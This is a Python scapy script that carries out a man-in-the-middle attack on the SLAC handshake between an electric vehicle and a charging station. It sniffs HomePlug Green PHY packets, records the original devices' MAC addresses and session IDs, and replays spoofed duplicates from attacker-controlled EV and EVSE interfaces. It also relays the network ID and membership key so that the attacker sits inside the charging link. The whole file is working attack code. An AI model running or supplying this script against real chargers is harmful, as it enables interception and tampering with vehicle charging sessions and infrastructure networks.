import logging
from scapy.all import Ether, sendp
from scapy.contrib.homepluggp import HomePlugGPTypes, CM_ATTEN_CHAR_IND, CM_MNBC_SOUND_IND, CM_SLAC_PARM_REQ, CM_SLAC_PARM_CNF
from ev_simulate_packets import duplicate_parm_req, duplicate_start_atten_char_ind, duplicate_mnbc_sound_ind, duplicate_cm_atten_char_rsp, duplicate_cm_slac_match_req
from evse_simulate_packets import duplicate_cm_slac_parm_cnf, duplicate_cm_atten_char_ind, duplicate_cm_slac_match_cnf


ev_host_mac = None
evse_host_mac = None
evse_modem_mac = None
original_evse_id = None
original_ev_id = None
original_ev_run_id = None

hpgp_types = {v: k for k, v in HomePlugGPTypes.items()}

logger = None

def init_logger():
    global logger
    logger = logging.getLogger(__name__)
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )
    logger.info('Initialized logger')


def handle_packet(
        packet,
        evse_simulation_interface,
        ev_simulation_interface,
        mitm_evse_mac,
        mitm_ev_mac,
        mitm_ev_run_id,
        mitm_ev_sender_id,
        nid_original_ev_simulated_evse,
        nmk_original_ev_simulated_evse
        ):
    global ev_host_mac, evse_host_mac, evse_modem_mac, original_evse_id, original_ev_id, original_ev_run_id

    init_logger()

    if not packet.haslayer(Ether) or not 'HomePlugAV' in packet:
        return

    # first SLAC packet from original EV host
    if packet['HomePlugAV'].HPtype == hpgp_types['CM_SLAC_PARM_REQ']:
        # make sure not to use the duplicated packet:
        if packet[CM_SLAC_PARM_REQ].RunID != mitm_ev_run_id:
            ev_host_mac = packet[Ether].src
            logger.info(f'Got first packet (CM_SLAC_PARM_REQ) from EV host: {ev_host_mac} - duplicating')
            duplicate_parm_req(packet, ev_simulation_interface, mitm_ev_mac, mitm_ev_run_id)

    # first SLAC packet from EVSE host
    if ev_host_mac and packet['HomePlugAV'].HPtype == hpgp_types['CM_SLAC_PARM_CNF']:
        # make sure not to use the answer for the duplicated CM_SLAC_PARM_REQ packet
        if packet[CM_SLAC_PARM_CNF].RunID != mitm_ev_run_id:
            # make sure not to use the duplicated CM_SLAC_PARM_CNF packet
            if packet[Ether].src != mitm_evse_mac:
                evse_host_mac = packet[Ether].src
                logger.info(f'Got first packet (CM_SLAC_PARM_CNF) from EVSE host: {evse_host_mac} - duplicating')
                duplicate_cm_slac_parm_cnf(packet, evse_simulation_interface, mitm_evse_mac)

    # information from ev to start sounding
    if packet['HomePlugAV'].HPtype == hpgp_types['CM_START_ATTEN_CHAR_IND']:
        # make sure that only packets from original ev are used for duplication
        if packet[Ether].src == ev_host_mac:
            logger.info(f'Got CM_START_ATTEN_CHAR_IND packet from {packet[Ether].src} - duplicating')
            duplicate_start_atten_char_ind(packet, ev_simulation_interface, mitm_ev_mac, mitm_ev_run_id)

    # sounding messages from ev
    if packet['HomePlugAV'].HPtype == hpgp_types['CM_MNBC_SOUND_IND']:
        # make sure to only use packets from original ev for duplication
        if packet[Ether].src == ev_host_mac:
            logger.info(f'Got CM_MNBC_SOUND_IND packet from {packet[Ether].src} - duplicating')
            duplicate_mnbc_sound_ind(packet, ev_simulation_interface, mitm_ev_mac, mitm_ev_run_id, mitm_ev_sender_id)
            original_ev_id = packet[CM_MNBC_SOUND_IND].SenderID
            original_ev_run_id = packet[CM_MNBC_SOUND_IND].RunID
            logger.info(f'Got Run ID and Sender ID of original EV. Sender ID: {original_ev_id} Run ID: {original_ev_run_id}')

    # first SLAC packet from EVSE modem - no duplication needed - only evse internal communication
    if evse_host_mac and packet['HomePlugAV'].HPtype == hpgp_types['CM_ATTENUATION_CHARACTERISTICS_MME']:
        evse_modem_mac = packet[Ether].src
        logger.debug(f'Captured evse_modem_mac from CM_ATTENUATION_CHARACTERISTICS_MME: {evse_modem_mac}')
        # just takes modem mac in case it is needed at some point

    # attenuation profile response from original EVSE
    if evse_modem_mac and packet['HomePlugAV'].HPtype == hpgp_types['CM_ATTEN_CHAR_IN']:
        # make sure that no duplicated packets are used
        if packet[Ether].src == evse_host_mac:
            # make sure that the only the response to the original ev is used
            if packet[CM_ATTEN_CHAR_IND].RunID == original_ev_run_id:
                logger.info(f'Got CM_ATTEN_CHAR_IN packet from {packet[Ether].src} - duplicating')
                duplicate_cm_atten_char_ind(packet, evse_simulation_interface, mitm_evse_mac)
                original_evse_id = packet[CM_ATTEN_CHAR_IND].ResponseID
                logger.info(f'Got Response ID of original EVSE: {original_evse_id}')

    # response from ev to attenuation profile info from evse
    if packet['HomePlugAV'].HPtype == hpgp_types['CM_ATTEN_CHAR_RSP']:
        # make sure that only packets from original ev are used (therefore also no duplicated ones)
        if packet[Ether].src == ev_host_mac:
            logger.info(f'Got CM_ATTEN_CHAR_RSP packet from {packet[Ether].src} - duplicating')
            duplicate_cm_atten_char_rsp(packet, ev_simulation_interface, mitm_ev_mac, mitm_ev_run_id, mitm_ev_sender_id)

    # matching request from original EV to mitm EVSE - forward from mitm EV to original EVSE
    if packet['HomePlugAV'].HPtype == hpgp_types['CM_SLAC_MATCH_REQ']:
        # make sure that only packets from original ev are used (therefore also no duplicated ones)
        if packet[Ether].src == ev_host_mac:
            logger.info(f'Got CM_SLAC_MATCH_REQ packet from {packet[Ether].src} - duplicating')
            duplicate_cm_slac_match_req(packet, ev_simulation_interface, mitm_ev_mac, mitm_ev_run_id, mitm_ev_sender_id, original_evse_id, evse_host_mac)

    # from original EVSE to mitm EV - forward from simulated EVSE to original EV
    if packet['HomePlugAV'].HPtype == hpgp_types['CM_SLAC_MATCH_CNF']:
        # make sure that only packets from original evse are used (therefore also no duplicated ones)
        if packet[Ether].src == evse_host_mac:
            logger.info(f'Got CM_SLAC_MATCH_CNF packet from {packet[Ether].src} - duplicating')
            duplicate_cm_slac_match_cnf(packet, evse_simulation_interface, mitm_evse_mac, original_evse_id, original_ev_id, ev_host_mac, original_ev_run_id, nid_original_ev_simulated_evse, nmk_original_ev_simulated_evse)